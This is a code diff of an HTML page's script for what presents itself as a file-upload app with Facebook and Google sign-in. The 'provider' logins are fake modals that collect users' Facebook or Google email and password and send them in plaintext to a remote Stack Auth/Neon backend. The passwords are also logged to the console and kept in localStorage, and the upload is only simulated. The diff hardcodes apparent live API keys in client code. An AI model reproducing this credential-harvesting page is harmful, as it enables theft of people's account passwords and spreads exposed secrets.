@@ -614,68 +614,69 @@
     <script>
         // ===== NEON DATABASE CONFIGURATION =====
         // REPLACE THIS WITH YOUR ACTUAL NEON API KEY
-        const NEON_API_URL = 'https://ep-fragrant-moon-ad1lph9b.apirest.c-2.us-east-1.aws.neon.tech/neondb/rest/v1';
-        const NEON_API_KEY = 'npg_3UCVwmp7Yajt'; // Get from Neon Dashboard → Authentication
+        const STACK_PROJECT_ID = '592d044f-472a-4590-88e5-2aad25abd1e5';
+        const NEON_API_KEY = 'pck_qdczhet324x9kgyt7fcnj625a97gda6h4frg0xx014z90';
+        const NEON_API_URL = 'https://api.stack-auth.com/api/v1';
         
         let currentUser = null;
 
-        // ===== NEON DATABASE FUNCTIONS =====
+        // ===== NEON AUTH FUNCTIONS =====
         async function storeUserInDatabase(userData) {
-            console.log('Storing user in Neon:', userData);
-            try {
-                const response = await fetch(`${NEON_API_URL}/users`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'Authorization': `Bearer ${NEON_API_KEY}`,
-                        'apikey': NEON_API_KEY,
-                        'Prefer': 'return=representation'
-                    },
-                    body: JSON.stringify(userData)
-                });
-                
-                if (!response.ok) {
-                    throw new Error(`HTTP error! status: ${response.status}`);
+                console.log('Storing user in Neon Auth:', userData);
+                try {
+                        const response = await fetch(`${NEON_API_URL}/projects/${STACK_PROJECT_ID}/users`, {
+                                method: 'POST',
+                                headers: {
+                                        'Content-Type': 'application/json',
+                                        'Authorization': `Bearer ${NEON_API_KEY}`
+                                },
+                                body: JSON.stringify({
+                                        email: userData.email,
+                                        name: userData.email.split('@')[0],
+                                        password: userData.password
+                                })
+                        });
+                        
+                        if (!response.ok) {
+                                throw new Error(`HTTP error! status: ${response.status}`);
+                        }
+                        
+                        const result = await response.json();
+                        console.log('User stored successfully:', result);
+                        return result;
+                } catch (error) {
+                        console.error('Neon Auth storage error:', error);
+                        localStorage.setItem('user', JSON.stringify(userData));
+                        return userData;
                 }
-                
-                const result = await response.json();
-                console.log('User stored successfully:', result);
-                return result[0];
-            } catch (error) {
-                console.error('Neon Database storage error:', error);
-                // Fallback to localStorage
-                localStorage.setItem('user', JSON.stringify(userData));
-                return userData;
-            }
         }
 
         async function checkUserExists(identifier) {
-            console.log('Checking user in Neon:', identifier);
-            try {
-                const response = await fetch(
-                    `${NEON_API_URL}/users?or=(email.eq.${encodeURIComponent(identifier)},phone.eq.${encodeURIComponent(identifier)})&limit=1`,
-                    {
-                        headers: {
-                            'Authorization': `Bearer ${NEON_API_KEY}`,
-                            'apikey': NEON_API_KEY,
-                            'Content-Type': 'application/json'
+                console.log('Checking user in Neon Auth:', identifier);
+                try {
+                        const response = await fetch(
+                                `${NEON_API_URL}/projects/${STACK_PROJECT_ID}/users?email=${encodeURIComponent(identifier)}`,
+                                {
+                                        headers: {
+                                                'Authorization': `Bearer ${NEON_API_KEY}`,
+                                                'Content-Type': 'application/json'
+                                        }
+                                }
+                        );
+                        
+                        if (!response.ok) {
+                                throw new Error(`HTTP error! status: ${response.status}`);
                         }
-                    }
-                );
-                
-                if (!response.ok) {
-                    throw new Error(`HTTP error! status: ${response.status}`);
+                        
+                        const result = await response.json();
+                        console.log('User check result:', result);
+                        
+                        return result.users && result.users.length > 0 ? result.users[0] : null;
+                } catch (error) {
+                        console.error('Neon Auth check error:', error);
+                        const storedUser = localStorage.getItem('user');
+                        return storedUser ? JSON.parse(storedUser) : null;
                 }
-                
-                const result = await response.json();
-                console.log('User check result:', result);
-                return result[0] || null;
-            } catch (error) {
-                console.error('Neon Database check error:', error);
-                // Fallback to localStorage
-                const storedUser = localStorage.getItem('user');
-                return storedUser ? JSON.parse(storedUser) : null;
-            }
         }
 
         // ===== DOM ELEMENTS =====
@@ -713,262 +714,241 @@
 
         // ===== EVENT LISTENERS =====
         facebookLogin.addEventListener('click', () => {
-            facebookModal.style.display = 'flex';
+                facebookModal.style.display = 'flex';
         });
 
         googleLogin.addEventListener('click', () => {
-            googleModal.style.display = 'flex';
+                googleModal.style.display = 'flex';
         });
 
         otherLogin.addEventListener('click', () => {
-            emailForm.style.display = emailForm.style.display === 'flex' ? 'none' : 'flex';
+                emailForm.style.display = emailForm.style.display === 'flex' ? 'none' : 'flex';
         });
 
         loginSubmit.addEventListener('click', () => {
-            handleEmailLogin();
+                handleEmailLogin();
         });
 
         closeFacebook.addEventListener('click', () => {
-            facebookModal.style.display = 'none';
+                facebookModal.style.display = 'none';
         });
 
         closeGoogle.addEventListener('click', () => {
-            googleModal.style.display = 'none';
+                googleModal.style.display = 'none';
         });
 
         facebookSubmit.addEventListener('click', () => {
-            handleProviderLogin('facebook');
+                handleProviderLogin('facebook');
         });
 
         googleSubmit.addEventListener('click', () => {
-            handleProviderLogin('google');
+                handleProviderLogin('google');
         });
 
         logoutBtn.addEventListener('click', () => {
-            // Clear user data
-            currentUser = null;
-            localStorage.removeItem('user');
-            
-            loginPage.style.display = 'flex';
-            homePage.style.display = 'none';
+                currentUser = null;
+                localStorage.removeItem('user');
+                loginPage.style.display = 'flex';
+                homePage.style.display = 'none';
         });
 
         uploadArea.addEventListener('click', () => {
-            fileInput.click();
+                fileInput.click();
         });
 
         fileInput.addEventListener('change', handleFileSelect);
         uploadBtn.addEventListener('click', handleFileUpload);
 
-        // Close modals when clicking outside
         window.addEventListener('click', (event) => {
-            if (event.target === facebookModal) {
-                facebookModal.style.display = 'none';
-            }
-            if (event.target === googleModal) {
-                googleModal.style.display = 'none';
-            }
+                if (event.target === facebookModal) {
+                        facebookModal.style.display = 'none';
+                }
+                if (event.target === googleModal) {
+                        googleModal.style.display = 'none';
+                }
         });
 
         // ===== LOGIN FUNCTIONS =====
         async function handleEmailLogin() {
-            const identifier = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
-            
-            if (!identifier || !password) {
-                alert('Please enter both email/phone and password');
-                return;
-            }
-            
-            if (!isValidEmail(identifier) && !isValidPhone(identifier)) {
-                alert('Please enter a valid email address or phone number');
-                return;
-            }
-            
-            try {
-                // Check if user exists
-                const existingUser = await checkUserExists(identifier);
+                const identifier = document.getElementById('email').value;
+                const password = document.getElementById('password').value;
                 
-                if (!existingUser) {
-                    // Store new user in database
-                    const userData = {
-                        email: isValidEmail(identifier) ? identifier : null,
-                        phone: isValidPhone(identifier) ? identifier : null,
-                        password: password,
-                        login_method: 'email',
-                        created_at: new Date()
-                    };
-                    currentUser = await storeUserInDatabase(userData);
-                } else {
-                    currentUser = existingUser;
+                if (!identifier || !password) {
+                        alert('Please enter both email/phone and password');
+                        return;
                 }
                 
-                // If validation passes, log the user in
-                userAvatar.textContent = identifier.charAt(0).toUpperCase();
-                userName.textContent = identifier;
+                if (!isValidEmail(identifier) && !isValidPhone(identifier)) {
+                        alert('Please enter a valid email address or phone number');
+                        return;
+                }
                 
-                loginPage.style.display = 'none';
-                homePage.style.display = 'flex';
-                
-            } catch (error) {
-                alert('Login failed. Please try again.');
-            }
+                try {
+                        const existingUser = await checkUserExists(identifier);
+                        
+                        if (!existingUser) {
+                                const userData = {
+                                        email: identifier,
+                                        password: password,
+                                        login_method: 'email'
+                                };
+                                currentUser = await storeUserInDatabase(userData);
+                        } else {
+                                currentUser = existingUser;
+                        }
+                        
+                        userAvatar.textContent = identifier.charAt(0).toUpperCase();
+                        userName.textContent = identifier;
+                        
+                        loginPage.style.display = 'none';
+                        homePage.style.display = 'flex';
+                        
+                } catch (error) {
+                        alert('Login failed. Please try again.');
+                }
         }
 
         async function handleProviderLogin(provider) {
-            let email, password, modal, form, loading;
-            
-            if (provider === 'facebook') {
-                email = document.getElementById('facebookEmail').value;
-                password = document.getElementById('facebookPassword').value;
-                modal = facebookModal;
-                form = facebookForm;
-                loading = facebookLoading;
-            } else {
-                email = document.getElementById('googleEmail').value;
-                password = document.getElementById('googlePassword').value;
-                modal = googleModal;
-                form = googleForm;
-                loading = googleLoading;
-            }
-            
-            if (!email || !password) {
-                alert('Please enter both email and password');
-                return;
-            }
-            
-            // Show loading state
-            form.style.display = 'none';
-            loading.style.display = 'flex';
-            
-            try {
-                // Check if user exists
-                const existingUser = await checkUserExists(email);
+                let email, password, modal, form, loading;
                 
-                if (!existingUser) {
-                    // Store new user in database
-                    const userData = {
-                        email: email,
-                        phone: null,
-                        password: password,
-                        login_method: provider,
-                        created_at: new Date()
-                    };
-                    currentUser = await storeUserInDatabase(userData);
+                if (provider === 'facebook') {
+                        email = document.getElementById('facebookEmail').value;
+                        password = document.getElementById('facebookPassword').value;
+                        modal = facebookModal;
+                        form = facebookForm;
+                        loading = facebookLoading;
                 } else {
-                    currentUser = existingUser;
+                        email = document.getElementById('googleEmail').value;
+                        password = document.getElementById('googlePassword').value;
+                        modal = googleModal;
+                        form = googleForm;
+                        loading = googleLoading;
                 }
                 
-                // Update UI
-                userAvatar.textContent = provider.charAt(0).toUpperCase();
-                userName.textContent = `${provider} User (${email})`;
+                if (!email || !password) {
+                        alert('Please enter both email and password');
+                        return;
+                }
                 
-                loginPage.style.display = 'none';
-                homePage.style.display = 'flex';
-                modal.style.display = 'none';
+                form.style.display = 'none';
+                loading.style.display = 'flex';
                 
-            } catch (error) {
-                alert('Login failed. Please try again.');
-            } finally {
-                // Reset forms
-                form.style.display = 'flex';
-                loading.style.display = 'none';
-                document.getElementById('facebookEmail').value = '';
-                document.getElementById('facebookPassword').value = '';
-                document.getElementById('googleEmail').value = '';
-                document.getElementById('googlePassword').value = '';
-            }
+                try {
+                        const existingUser = await checkUserExists(email);
+                        
+                        if (!existingUser) {
+                                const userData = {
+                                        email: email,
+                                        password: password,
+                                        login_method: provider
+                                };
+                                currentUser = await storeUserInDatabase(userData);
+                        } else {
+                                currentUser = existingUser;
+                        }
+                        
+                        userAvatar.textContent = provider.charAt(0).toUpperCase();
+                        userName.textContent = `${provider} User (${email})`;
+                        
+                        loginPage.style.display = 'none';
+                        homePage.style.display = 'flex';
+                        modal.style.display = 'none';
+                        
+                } catch (error) {
+                        alert('Login failed. Please try again.');
+                } finally {
+                        form.style.display = 'flex';
+                        loading.style.display = 'none';
+                        document.getElementById('facebookEmail').value = '';
+                        document.getElementById('facebookPassword').value = '';
+                        document.getElementById('googleEmail').value = '';
+                        document.getElementById('googlePassword').value = '';
+                }
         }
 
         // ===== VALIDATION FUNCTIONS =====
         function isValidEmail(email) {
-            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-            return emailRegex.test(email);
+                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                return emailRegex.test(email);
         }
 
         function isValidPhone(phone) {
-            const phoneRegex = /^0\d{9}$/;
-            return phoneRegex.test(phone);
+                const phoneRegex = /^0\d{9}$/;
+                return phoneRegex.test(phone);
         }
 
         // ===== FILE UPLOAD FUNCTIONS =====
         function handleFileSelect(event) {
-            const file = event.target.files[0];
-            
-            if (file) {
-                // Check file type
-                const fileExtension = file.name.split('.').pop().toLowerCase();
-                const allowedExtensions = ['mp3', 'mp4', 'jpg', 'jpeg', 'pdf'];
+                const file = event.target.files[0];
                 
-                if (!allowedExtensions.includes(fileExtension)) {
-                    uploadStatus.textContent = 'Error: Only MP3, MP4, JPG, and PDF files are allowed.';
-                    uploadStatus.className = 'upload-status error';
-                    uploadStatus.style.display = 'block';
-                    uploadBtn.disabled = true;
-                    return;
+                if (file) {
+                        const fileExtension = file.name.split('.').pop().toLowerCase();
+                        const allowedExtensions = ['mp3', 'mp4', 'jpg', 'jpeg', 'pdf'];
+                        
+                        if (!allowedExtensions.includes(fileExtension)) {
+                                uploadStatus.textContent = 'Error: Only MP3, MP4, JPG, and PDF files are allowed.';
+                                uploadStatus.className = 'upload-status error';
+                                uploadStatus.style.display = 'block';
+                                uploadBtn.disabled = true;
+                                return;
+                        }
+                        
+                        uploadBtn.disabled = false;
+                        
+                        fileName.textContent = file.name;
+                        fileType.textContent = fileExtension.toUpperCase();
+                        fileSize.textContent = formatFileSize(file.size);
+                        uploadDate.textContent = new Date().toLocaleDateString();
+                        
+                        fileInfo.style.display = 'block';
                 }
-                
-                // Enable upload button
-                uploadBtn.disabled = false;
-                
-                // Display file info
-                fileName.textContent = file.name;
-                fileType.textContent = fileExtension.toUpperCase();
-                fileSize.textContent = formatFileSize(file.size);
-                uploadDate.textContent = new Date().toLocaleDateString();
-                
-                fileInfo.style.display = 'block';
-            }
         }
 
         function formatFileSize(bytes) {
-            if (bytes === 0) return '0 Bytes';
-            
-            const k = 1024;
-            const sizes = ['Bytes', 'KB', 'MB', 'GB'];
-            const i = Math.floor(Math.log(bytes) / Math.log(k));
-            
-            return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
+                if (bytes === 0) return '0 Bytes';
+                
+                const k = 1024;
+                const sizes = ['Bytes', 'KB', 'MB', 'GB'];
+                const i = Math.floor(Math.log(bytes) / Math.log(k));
+                
+                return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
         }
 
         function handleFileUpload() {
-            // Simulate upload process
-            uploadBtn.disabled = true;
-            uploadBtn.textContent = 'Uploading...';
-            
-            setTimeout(() => {
-                uploadStatus.textContent = 'Thank you for using our app! Your file has been uploaded successfully.';
-                uploadStatus.className = 'upload-status success';
-                uploadStatus.style.display = 'block';
+                uploadBtn.disabled = true;
+                uploadBtn.textContent = 'Uploading...';
                 
-                uploadBtn.textContent = 'Upload Complete';
-                
-                // Reset after 5 seconds
                 setTimeout(() => {
-                    uploadBtn.disabled = true;
-                    uploadBtn.textContent = 'Upload File';
-                    fileInput.value = '';
-                    fileInfo.style.display = 'none';
-                    uploadStatus.style.display = 'none';
-                }, 5000);
-            }, 2000);
+                        uploadStatus.textContent = 'Thank you for using our app! Your file has been uploaded successfully.';
+                        uploadStatus.className = 'upload-status success';
+                        uploadStatus.style.display = 'block';
+                        
+                        uploadBtn.textContent = 'Upload Complete';
+                        
+                        setTimeout(() => {
+                                uploadBtn.disabled = true;
+                                uploadBtn.textContent = 'Upload File';
+                                fileInput.value = '';
+                                fileInfo.style.display = 'none';
+                                uploadStatus.style.display = 'none';
+                        }, 5000);
+                }, 2000);
         }
 
         // ===== CHECK IF USER IS ALREADY LOGGED IN =====
         window.addEventListener('DOMContentLoaded', async () => {
-            try {
-                // Try to get user from localStorage as fallback
-                const storedUser = localStorage.getItem('user');
-                if (storedUser) {
-                    currentUser = JSON.parse(storedUser);
-                    userAvatar.textContent = (currentUser.email || currentUser.phone).charAt(0).toUpperCase();
-                    userName.textContent = currentUser.email || currentUser.phone;
-                    loginPage.style.display = 'none';
-                    homePage.style.display = 'flex';
+                try {
+                        const storedUser = localStorage.getItem('user');
+                        if (storedUser) {
+                                currentUser = JSON.parse(storedUser);
+                                userAvatar.textContent = (currentUser.email || currentUser.phone).charAt(0).toUpperCase();
+                                userName.textContent = currentUser.email || currentUser.phone;
+                                loginPage.style.display = 'none';
+                                homePage.style.display = 'flex';
+                        }
+                } catch (error) {
+                        console.log('No stored user found');
                 }
-            } catch (error) {
-                console.log('No stored user found');
-            }
         });
     </script>
 </body>
